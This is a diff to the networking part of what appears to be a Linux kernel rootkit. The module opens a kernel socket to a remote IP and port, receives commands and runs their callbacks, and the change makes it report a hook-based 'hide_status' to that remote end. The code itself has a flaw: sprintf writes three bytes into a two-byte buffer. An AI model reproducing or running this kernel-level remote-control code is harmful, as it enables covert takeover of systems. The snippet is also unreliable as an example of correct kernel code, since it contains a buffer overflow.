@@ -7,9 +7,9 @@
 #include <linux/net.h>
 
 #include "commands.h"
+#include "hook.h"
 
 static struct socket *sock = NULL;
-static char *message = "Hello World! from kernel land";
 
 static void *convert(void *ptr)
 {
@@ -21,8 +21,11 @@ int network_init(const char *ip, int port)
     struct sockaddr_in addr = { 0 };
     struct msghdr msg = { 0 };
     struct kvec vec = { 0 };
+    char hide_status[2] = { 0 };
     unsigned char ip_binary[4] = { 0 };
     int ret = 0;
+
+    sprintf(hide_status, "%d\n", hook_status());
 
     pr_info("network: initializing socket\n");
 
@@ -50,8 +53,8 @@ int network_init(const char *ip, int port)
         return 1;
     }
 
-    vec.iov_base = message;
-    vec.iov_len = strlen(message);
+    vec.iov_base = hide_status;
+    vec.iov_len = 2;
 
     if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
     {
@@ -61,7 +64,7 @@ int network_init(const char *ip, int port)
         return 1;
     }
 
-    pr_info("network: message '%s' sent to %s:%d\n", message, ip, port);
+    pr_info("network: message '%s' sent to %s:%d\n", hide_status, ip, port);
     return 0;
 }
 
@@ -149,11 +152,11 @@ int network_loop(void *data)
                         "network: couldn't send status buffer back: %d\n", ret);
                 NET_ERROR(status_buf)
             }
-            memset(resp_buf, 0, sizeof(resp_buf));
+            memset(&resp_buf, 0, 1024);
             continue;
         }
 
-        memset(resp_buf, 0, sizeof(resp_buf));
+        memset(&resp_buf, 0, 1024);
         if ((ret = cmd.callback(sock, cmd.args) != 0))
         {
             if (ret != -1)
